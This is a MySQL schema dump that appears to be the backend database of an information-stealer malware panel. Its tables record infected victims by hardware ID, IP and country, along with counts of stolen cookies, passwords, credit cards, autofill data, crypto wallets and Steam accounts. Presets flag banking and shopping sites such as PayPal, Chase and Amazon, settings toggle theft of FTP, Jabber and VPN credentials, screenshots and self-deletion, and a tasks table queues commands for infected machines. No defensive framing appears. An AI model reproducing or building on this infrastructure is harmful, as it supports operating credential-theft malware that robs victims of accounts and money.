
SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

CREATE TABLE `grabber` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `folder` text NOT NULL,
  `pattern` text NOT NULL,
  `exception` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;


CREATE TABLE `logs` (
  `id` int(11) NOT NULL,
  `userID` text NOT NULL,
  `hwid` text NOT NULL,
  `system` text NOT NULL,
  `ip` text NOT NULL,
  `country` text NOT NULL,
  `date` text NOT NULL,
  `count` int(11) DEFAULT NULL,
  `cookie` int(11) DEFAULT NULL,
  `pswd` int(11) DEFAULT NULL,
  `buildversion` text,
  `credit` int(11) DEFAULT '0',
  `autofill` int(11) DEFAULT '0',
  `wallets` int(11) DEFAULT '0',
  `checked` int(11) NOT NULL DEFAULT '0',
  `comment` text NOT NULL,
  `preset` text,
  `steam` INT DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `presets` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `color` text NOT NULL,
  `pattern` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `presets` (`id`, `name`, `color`, `pattern`) VALUES
(1, 'Shop', 'green', 'amazon;ebay;walmart;newegg;apple;bestbuy'),
(2, 'Money', 'GOLD', 'paypal;chase.com;TD;wells;capitalone;skrill;PayU');

-- --------------------------------------------------------

CREATE TABLE `settings` (
  `id` int(11) NOT NULL,
  `cisLogs` text NOT NULL,
  `repeatLogs` text NOT NULL,
  `telegram` text NOT NULL,
  `history` text NOT NULL,
  `autocomplete` text NOT NULL,
  `cards` text NOT NULL,
  `cookies` text NOT NULL,
  `passwords` text NOT NULL,
  `jabber` text NOT NULL,
  `ftp` text NOT NULL,
  `screenshot` text NOT NULL,
  `selfDelete` text NOT NULL,
  `vpn` text NOT NULL,
  `grabber` text NOT NULL,
  `executionTime` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `settings` (`id`, `cisLogs`, `repeatLogs`, `telegram`, `history`, `autocomplete`, `cards`, `cookies`, `passwords`, `jabber`, `ftp`, `screenshot`, `selfDelete`, `vpn`, `grabber`, `executionTime`) VALUES
(0, 'on', 'on', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', '0');

-- --------------------------------------------------------


CREATE TABLE `tasks` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `count` int(11) NOT NULL,
  `country` text NOT NULL,
  `task` text NOT NULL,
  `preset` text NOT NULL,
  `params` text NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `usr` (
    `name` TEXT NOT NULL,
    `pass` TEXT NOT NULL
)

ALTER TABLE `grabber`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `logs`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `presets`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `id` (`id`),
  ADD UNIQUE KEY `id_2` (`id`);

ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);
ALTER TABLE `tasks`
  ADD PRIMARY KEY (`id`);
ALTER TABLE `grabber`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

ALTER TABLE `logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=268;

ALTER TABLE `presets`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

ALTER TABLE `tasks`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
